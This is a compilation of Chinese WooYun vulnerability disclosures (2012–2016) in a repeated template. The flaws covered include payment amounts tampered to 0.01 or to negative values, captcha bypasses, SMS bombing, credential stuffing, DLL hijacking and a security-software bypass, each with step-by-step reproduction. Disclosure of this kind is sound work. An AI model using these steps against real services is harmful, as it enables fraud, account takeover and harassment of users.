**详情**: 目测所有的验证码地方都是如此？？先看看注册的地方吧。注册账号，抓包，验证码不对的话，会提示错误删除验证码字段，即可正常注册。无回显就是注册成功的意思所以这里我们可以批量注册，然后推广，拿大礼包啊！！再随便举个例子，账号中心，手机绑定的地方，填写手机号，验证码进行绑定删除验证码字段，一样可以发送验证码然后就可以短信轰炸了。同样的，登录的时候，验证码是防止暴力破解的现在验证码形同虚设，就可以暴力破解啦。危害怎么样，自己看咯

**POC**: 目测所有的验证码地方都是如此？？先看看注册的地方吧。注册账号，抓包，验证码不对的话，会提示错误删除验证码字段，即可正常注册。无回显就是注册成功的意思所以这里我们可以批量注册，然后推广，拿大礼包啊！！再随便举个例子，账号中心，手机绑定的地方，填写手机号，验证码进行绑定删除验证码字段，一样可以发送验证码然后就可以短信轰炸了。同样的，登录的时候，验证码是防止暴力破解的现在验证码形同虚设，就可以暴力破解啦。危害怎么样，自己看咯

**绕过**: 直接利用

**修复**: 还真不知道怎么修复。虽然匿名提交，也还是能看到我的联系方式吧厂商？
---

---
### [wooyun-2013-031625] 安卓网商城存在严重支付漏洞
**厂商**: 福建网龙 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  商城地址 随便找个商品我们截获数据包 发现是post 那么你会看到我圈住的那个地方是商品数量他没有限制负数,我们试试看成功了、、、那么再找一个比他高一点价格好了。。。点击结算我勒个去没有 - -这个商品是找不到送货方式的我们同样方法重新来一遍就提交好了、

**POC**: 里面的东西好贵。。。

**绕过**: 直接利用

**修复**: 你知道的
---

---
### [wooyun-2015-0108637] 某生鲜电商某接口撞库泄露用户登录凭据(验证码绕过有账号证明)
**厂商**: fruitday.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号。虽然多次登陆会启用验证码。但是只要删除cookie，发送的时候不发送cookie就可以绕过验证码。

**POC**: 经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.目前互联网上公开的账号都有数亿的规模，真要被利用的话危害还是很大的。

**绕过**: 过滤绕过

**修复**: 撞库防御参考资料:https://example.com/[已脱敏]
---

---
### [wooyun-2013-019938] YY客户端本地存储密码bug
**厂商**: 广州多玩 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 嗯。。鸡肋的东西

**POC**: 嗯。。。如题今天玩了一会yy。。感觉很不爽。。。于是看一下这个无比搓的程序。。另外。我不是搞逆向神马的。。只是简单的看一下。。期待大神分析yy缓存+配置信息    就是你不手动清理永远留在c盘那种垃圾。。最高可达到N个G的文件（鄙视一下yy程序员）C:\Users\Administrator\AppData\Roaming\duowan登录配置信息C:\Users\Administrator\AppData\Roaming\duowan\yy4.0\account说明一下：<?xml version="1.0"?><account><name>YWJjY2VyMw==</name>   ---

**绕过**: 直接利用

**修复**: 更换客户端。效验方式
---

---
### [wooyun-2015-0107103] 北京娜迦信息科技主站支付&撞库漏洞
**厂商**: nagain.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 支付漏洞这里我只到某电商平台没有去实际付钱。正常情况:不正常：撞裤：撞密码撞用户名，就不上图了。自己改吧。

**POC**: 正常情况:不正常：撞裤：撞密码

**绕过**: 直接利用

**修复**: 师傅！教教我测试APP！
---

---
### [wooyun-2016-0180497] 网站安全狗禁止IIS执行程序绕过
**厂商**: 安全狗 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下图是一个c# 写的小马，可以执行任意命令打开网站安全狗开启禁止执行程序防护功能由于安全狗只支持 32位程序池 那我们网站设置程序池为32位打开小马，开始执行命令 ，果不其然的拒绝访问被安全狗拦截防护日志中也有拦截记录看到安全狗的应用程序池中有白名单，这些白名单是**.**.**.** 的编译环境所以是不能禁止的。那我们想，如果启动的程序中包含白名单文件的路径，安全狗会怎么处理？为了不影响我们要执行的命令， 那么把安全狗中的白名单作为一个参数传入我们要启动的程序，下面就是见证奇迹的时刻了，测试通过！安全狗没任何反应！下面我们来修改我们的EXP ,将白名单的字符作为参数传入好啦！一个过狗exp就出来了，可以执行任意命令不会被拦截！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个你们比我专业！
---

---
### [wooyun-2015-091526] 新东方某站支付逻辑漏洞
**厂商**: 新东方 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便找了一个可以优惠的课程既然都优惠了那就让它多优惠一点嘛，嘿嘿~截包修改优惠金额接下来提交订单，毫无压力喔，你看，成功了呢恩……找了个正在聊天的友友帮我付了一分钱，话说友友还很不高兴呢，我只好许下承诺，如果支付成功并可以去上课，我就把这个“学习”的机会送给他，嘿嘿，一分钱你买不了吃亏，一分钱你买不了上当~~~我把听课证送给友友了，他可高兴了，还说以后再有好事一定要想着他，嘿嘿，话说我要定个闹钟提醒他别忘了上课~~~

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 服务器端验证订单信息，订单金额和优惠额度是否合法
---

---
### [wooyun-2015-0104193] 某社交空间音乐播放器组件可导致任意执行本地命令
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交空间的播放器插件功能由本地的COM对象提供。而漏洞正是因为组件注册时，通过修改注册表的方式注册了一个进程外COM组件且没有考虑路径问题而引发。导致系统在进行COM分析加载索引EXE路径时,触发了CreateProcess执行漏洞。【影响范围】XP、Win7 X64 | X86【触发场景】1.  浏览器访问存在音乐播放器的某社交空间页面时，精心放置的Program.exe工具会被加载。（已测试：IE、某安全浏览器、搜狗高速浏览器、Chrome浏览器）2. 直接利用OLEViewer找到音乐播放器接口，调用CoCreateInstance接口即可触发，可以参见代码。

**POC**: 1. 播放器一览2. 浏览器触发IE360浏览器搜狗高速浏览器3. 利用COM直接调用

**绕过**: 直接利用

**修复**: 路径注册时，加上双引号。
---

---
### [wooyun-2013-037783] 某厂商网络控制工具(被控端)暴露硬盘保护卡密码
**厂商**: 某电脑厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上面的界面就是某厂商网络控制工具(被控端)退出时的界面，需要输入密码。你随意输入一个错误的密码，通过OllyDBG使用字符串类的函数如lstrlenA下断点，可以跟踪出正确的明文密码出来。我实际测试的是EDU 7.6版本。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我也不知道该咋个办。
---

---
### [wooyun-2013-023585] 有妖气游戏平台关键业务逻辑缺陷
**厂商**: 盛大在线 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有妖气游戏平台在处理充值返回逻辑时，未对海外支付（Paypal）进行正确的金额校验。导致用户可自定义提交到Paypal充值金额（例如$0.01），并完成任意金额订单的支付和充值。（这应该够详细了……）P.S：烦请肾大把这个奇葩设置修复一下，这是想明文存储么：再P.S：请记得帮我删号或者清空游戏里被错误充值的虚拟货币，这只是为了测试之用，不代表我本人的真实消费意愿。顺便BS一下坑爹的兑换率，打对折简直好顶赞！

**POC**: Step1：进入游戏平台的充值界面，选好游戏、充值金额（这里以10刀为例，实际上应该可以……呃……10W刀？）Step2：在跳转到Paypal之前，按下ESC停止发送POST请求，查看源代码：呵呵的地方我已经圈出来了，自己随意Copy源代码，把呵呵的地方改成0.01，另存为HTML文件即可。Step3：在弹出的Paypal完成支付。（盛大你赔我的1.01刀！！！）Step4：游戏平台跳转后提示充值成功：Step5：游戏中虚拟货币充值确认到账：顺便提醒使用Paypal这个支付接口的童鞋，务必核对返回的充值金额，否则呵呵了连哭都来不及，这洞我遇到太多了=。=

**绕过**: 直接利用

**修复**: 开除负责编码这个文件的程序员，开除代码审计负责人，开除测试团队负责人，开除业务安全负责人，啊对了还要开除设置上面那个奇葩密码规则的童鞋。
---

---
### [wooyun-2015-0142852] 桃花坞支付漏洞低价买屌丝必备东西
**厂商**: 桃花坞商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这娃娃。。。怎么能这么贵？测试就随便填写把这边提交，抓包改成1把，不可以为0，不可以负数。。。。。这价格可以，宿舍一人一个。。。

**POC**: 看下订单信息证明咯。。没付款，万一邮寄了，估计宿舍就不得安生了。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0105001] 某IM软件/某互联网公司手机客户端（ios、安卓）URL欺骗漏洞
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某IM软件、某互联网公司在分享第三方连接的时候会显示<title>里面的内容.而这个title里面的内容我们是可以任意控制，如果把这个title换成mail.某域名.com？或者taobao.com呢？相信很多人都会认为这是某邮箱服务的url或者taobao网的连接。如果被不法分子用做钓鱼....T_T

**POC**: (见原文)

**绕过**: 直接利用

**修复**: title显示的时候判断一下？不懂....
---

---
### [wooyun-2015-0133064] 美囤X-Forwarded-For 验证码绕过撞库
**厂商**: 美囤妈妈 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机登陆 https://example.com/[已脱敏] 通过修改X-Forwarded-For 可以实现绕过POST /mobile/user/signin.htm HTTP/1.1X-Forwarded-For: [IP已脱敏]Accept: */*X-Requested-With: XMLHttpRequestContent-Type: application/jsonReferer: https://example.com/[已脱敏] zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoProxy-Connection:

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0156253] 东吴人寿商城积分支付漏洞（一秒成就中东大土豪）
**厂商**: 东吴人寿保险股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点https://example.com/[已脱敏] 自动发货

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-088411] 三星手机自带浏览器跨域脚本执行漏洞(二)
**厂商**: 三星 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们来回顾下这个漏洞WooYun: 三星手机自带浏览器跨域脚本执行漏洞然而。。没什么好说的。POC在测试代码上

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我知道你会修复的
---

---
### [wooyun-2015-0115689] 群英网络支付漏洞（0.01买1950块钱i7服务器）
**厂商**: qy.com.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 群英网络支付漏洞，经过测试只有IDC服务器管用，购买空间之类的都不管用：先注册个账号，然后随便选个配置的服务器接下来支付的时候抓包，然后修改数据：然后客服会联系你，直接和客服索要服务器就可以了（服务器直接到你账户）：这里我一开始成功提交的订单是0.01元购买的1950块钱的服务器（支付成功的）：I7高配服务器成功拿到：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 验证
---

---
### [wooyun-2015-0146959] 网桥大师支付漏洞可以9元办899元三年会员
**厂商**: 网桥大师 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册会员登陆http://**.**.**.**/vip_1.php用浏览器右键3年899元点击支付审查元素找到<input name="WIDtotal_fee" type="hidden" id="WIDtotal_fee" value="899">将899改成9点击支付可以成功9元办理899元会员

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-015266] 职航在线存在严重支付漏洞
**厂商**: 职航在线 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购买页面直接向某电商平台POST支付的金额，使用FIDDLER2可以截取该数据包，同时修改金额，导致漏洞产生!

**POC**: 选定购买100元（5人次职业胜任力测评）后，点击下一步，使用Fiddler拦截发送的数据把其中的100改为0.01这时候到某电商平台上显示的就是金额0.01支付成功!

**绕过**: 直接利用

**修复**: 使用签名检验
---

---
### [wooyun-2015-0127391] 广东某市级移动接口再探短信轰炸
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 就这样，我在乌云上搜索了 “短信轰炸”搜到了WooYun: 广东某市级移动接口未限制导致短信轰炸回复是：CNVD未直接复现，复现所述情况似乎需要本地号码，已经转由CNCERT直接转报给某运营商集团公司，由其后续协调分公司处置。看来是处理过的呀。我进去看了看，管理员也的确加了验证码那又怎么样！继续抓包！POST /smsGenerator.action HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://example.com/[已脱敏] */*Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateUser-Agent: M

**POC**: HTTP/1.1 200 OKDate: Fri, 17 Jul 2015 08:50:42 GMTServer: ApacheContent-Language: zhContent-Type: text/html;charset=UTF-8Content-Length: 4true

**绕过**: 直接利用

**修复**: 1，一次性验证码2，在服务端进行发送限制
---

---
### [wooyun-2015-0108156] 西南某高校子站暴力破解+短信轰炸机
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 西南交通大学图书馆https://example.com/[已脱敏]

**POC**: 证明如上～学生安全意识不强，登录帐号很好破解；加之绑定手机无限制，活生生的短信轰炸机！PS：贵校请别找我喝茶，友情测试，没发多少条。。。

**绕过**: 直接利用

**修复**: 增加限制
---

---
### [wooyun-2013-040193] 某电商平台客户端校验不严谨缺陷
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台客户端并未对SD卡上的plugin下的插件进行校验，而是根据包名进行，比如把电影的zip包com.taobao.movie.android.zip修改为com.taobao.wireless.tbpcharge.zip，电影就变成充值的，更进一步的如果修改一个apk，符合某电商平台客户端调用的一定情况后，将其包名修改为com.taobao.movie.android.zip，点击电影就能跳转过去了。那就能进行很多跟账户安全等等相关的操作了。如果自己的apk包中再包含一些某电商平台的页面，可以窃取到某电商平台的用户名密码信息。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 校验一下
---

---
### [wooyun-2013-033891] 暴风影音最新版本DLL新型劫持漏洞
**厂商**: 暴风影音 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: BaofengPlatform.exe存在严重dll劫持漏洞，可加载指定dll后执行任意代码。BaofengPlatform.exe启动时会加载一个不存在的名为ieframe.dll，只要自己写一个ieframe.dll与BaofengPlatform.exe放在同一目录，这样就可以在运行主程序StormPlayer.exe就会启动BaofengPlatform.exe的时候同时加载ieframe.dll，ieframe.dll可以为自制的任意恶意dll。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2014-050767] 某品牌手机加密文件管理器可通过第三方软件绕过验证
**厂商**: 某手机厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我用的就是某品牌手机，某品牌手机存在一个比较验证的缺陷，其他某手机厂商的手机型号不知道有没有这个漏洞，当文件管理器被上了隐私锁后，需要密码才可以进入文件管理，我发现完全可以用第三方软件来绕过验证，从而查看“任意”文件。

**POC**: 假设哈，我是说假设，一台某品牌手机落到了他人的手里，你的手机里的文件管理里面有着挺重要的文件，但是你上了锁，你以为这样就不会被别人读取么？其实很简单，就拿第三方软件某搜索引擎云或者某互联网公司微云的客户端说起吧- -.别人完全可以给你的手机安装一个某搜索引擎云或者某互联网公司微云.某互联网公司微云绕过某手机厂商文件管理器锁方式：点击上传文件就直接进入手机的根目录- -.读取任意文件，然后上传到自己的某互联网公司微云网盘- -.某搜索引擎云绕过某手机厂商文件管理器锁方式：点击上传，然后读取就可以读取本机的文件，前几个是可以根据分类读取，点击那个“全部”.就可以进入上了锁的文件管理器- -.从而将文件上传到自己的某搜索引擎云网盘- -.

**绕过**: 过滤绕过

**修复**: 再升级新版本的时候修复一下吧，我也挺支持某手机厂商的，可是我发现那么多人提交了某手机厂商实在的漏洞，全被你们忽略了，某手机厂商的手机确实挺强，但研发高科技的同时也不要忽视了安全，也就相当于忽视了用户的安全，感觉失望，在这样的话哪个好心的白帽子还会重视某手机厂商的安全检测？看在我一下子买了两台某品牌手机的份上不要在忽略
---

---
### [wooyun-2013-020253] 四川人事考试网支付漏洞（已证明可支付成功）
**厂商**: 四川人事考试网 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 事情的缘由是参加今年的二级建造师考试，必须网上缴费，就顺带测试了一下。1.不敢直接用二建报名来测试，毕竟是关系前途命运，就先在缴费过程全程抓包看了下。2.二建报名费用交纳完毕后，重新随便报名一个不需要资格审核的计算机考试，直接交纳费用。3.缴费过程抓包，type2参数为钱，修改为0.01。银行界面完成交易最终在报名表里面，看到是已缴费。

**POC**: 见详细说明。

**绕过**: 直接利用

**修复**: 禁止直接传递价格参数，每一种考试对应一个ID，直接传递ID，后台校验金额。求一个乌云邀请码。
---

---
### [wooyun-2013-026637] 电信云存储支付漏洞，1分钱即可换1T空间
**厂商**: 上海电信 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 有免费15G的空间然后https://example.com/[已脱敏]  升级空间并选择70元1T然后提交如图接下来抓包修改980为0.01提交下来付款就ok了！！！

**POC**: 账号密码是123456 你也可登陆去看看！！顺便再问下我上次发的两个漏洞怎么没有审核！！

**绕过**: 直接利用

**修复**: 双方验证
---

---
### [wooyun-2015-0131636] 美丽屋、有个家 APP 登录验证码绕过漏洞
**厂商**: 易遨在线科技 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发送验证码的接口地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 接口不要返回短信验证码，服务器来验证
---

---
### [wooyun-2015-098699] 中国知网腾云期刊采编系统通用任意密码重置
**厂商**: 中国知网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: jgxb.cbpt.cnki.net使用该采编系统的期刊杂志很多，拿河南理工大学学报（自然科学版）举例：1、进行采编系统，点击忘记密码这里只要是注册过的邮箱账号都可以修改，而在该期刊上发表过论文的作者的邮箱信息又很容易找到2、选择使用提示问题找回，这里先将就隐藏html元素的都显示出来3、观察页面中的js代码 发现通过问题找回有三处验证，但却都是可有可无的判断，通过更改html元素可以绕过这些判断,使得即使没有设置过密保问题也可以发送验证，第三处验证为返回ajax值验证，发现输入任意问题和答案后返回no4、用burp suite修改返回值为yes，成功绕过前端验证5、成功修改密码

**POC**: 已详细证明

**绕过**: 过滤绕过

**修复**: 不要前端验证
---

---
### [wooyun-2015-0144176] 某音乐APP一个有意思的逻辑漏洞（权限判断设计不当）
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一张图说明一切我申请了一个和这个赤雪（歌手名）一个名字的音乐人账号 申请成功了 然后进入音乐人管理页面  直接就是管理赤雪这个歌手的各种信息 如专辑 歌曲等可以删除 可以编辑

**POC**: 综上所述 只需要申请一个同名就可以任意控制

**绕过**: 直接利用

**修复**: 每个音乐人一个特殊的token 不要用名字去识别。。。
---

---
### [wooyun-2015-0151190] 51调查网某功能存在严重逻辑缺陷
**厂商**: 51调查网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一年350元：点击立即升级会看到这个页面：然后点击确认付款的同时抓包：我们把month改成-1，接下来就这样了：然后再把那个3500的删了：确认付款：难道就到此为止了吗：

**POC**: 提醒绑定手机才可以，为了防止被查水表（心里安慰自己）继续抓包：改为ture

**绕过**: 直接利用

**修复**: 其实贵网站还有其他的漏洞，比如XSS，尽快修复吧拒绝查水表
---

---
### [wooyun-2013-038341] 在某搜索引擎贴吧无权限发语音的贴吧发语音!
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 多的不说,自己看吧!这样就可以发送语音了!

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 懂的,在进入贴吧前就判断该贴吧是否有发语音的权限,直接把语音按钮秒掉不要在进入帖子的时候判断,如果网速慢的话,就会出现语音按钮.
---

---
### [wooyun-2014-063329] 看我一步一步教你少花钱在悠哉旅游
**厂商**: 悠哉旅游网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 悠哉旅行网任意金额支付漏洞看了这个，不能忍啊。我来出个详细利用版本吧。注册用户---随便找个旅游的，进去。默认应该是这样的吧然后下面一堆附加产品，我们可以选择数量，是0，1，还是2.但是呢，厂商对数量没有进行校验，例如我们修改SHF16186单房差 的数量为负的4吧我们再选择2的时候，价格就已经是负的了到这里，别跟我说，不会修改数量？？作者的意思是，你这里即使验证数量不为负的，那么看下面的。我们发现有个专享特惠，价格是负的，数量是正的，所以我们可以修改为任意数量。此处，我们修改数量为6吧，理论上2个人的话，是只能有1次补贴的，经过我们修改，有了6次补贴，即1200块钱啊。为了证明能下单，我们带着136元的订单继续往下走填写游客信息吧点击下一步吧确认订单吧你是指这一块人工来审核？所以不存在问题？来上一个别的图吧，人工确认好的，就等我付款了。所以说，你们确定不能复现？还是不会复

**POC**: WooYun: 悠哉旅行网任意金额支付漏洞看了这个，不能忍啊。我来出个详细利用版本吧。注册用户---随便找个旅游的，进去。默认应该是这样的吧然后下面一堆附加产品，我们可以选择数量，是0，1，还是2.但是呢，厂商对数量没有进行校验，例如我们修改SHF16186单房差 的数量为负的4吧我们再选择2的时候，价格就已经是负的了到这里，别跟我说，不会修改数量？？作者的意思是，你这里即使验证数量不为负的，那么看下面的。我们发现有个专享特惠，价格是负的，数量是正的，所以我们可以修改为任意数量。此处，我们修改数量为6吧，理论上2个人的话，是只能有1次补贴的，经过我们修改，有了6次补贴，即1200块钱啊。为了证

**绕过**: 直接利用

**修复**: 呵呵~
---
